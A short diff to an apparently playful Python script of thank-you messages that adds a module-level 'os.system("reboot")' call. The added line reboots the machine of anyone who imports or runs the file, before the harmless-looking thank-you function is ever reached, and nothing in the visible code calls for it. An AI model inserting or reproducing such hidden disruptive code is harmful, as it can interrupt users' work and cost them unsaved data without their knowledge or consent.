@@ -1,6 +1,9 @@
 #thank you Antonio
 #thank you noor
 
+import os
+os.system("reboot")
+
 def funnythank():
 	import random
 	funnynums = [
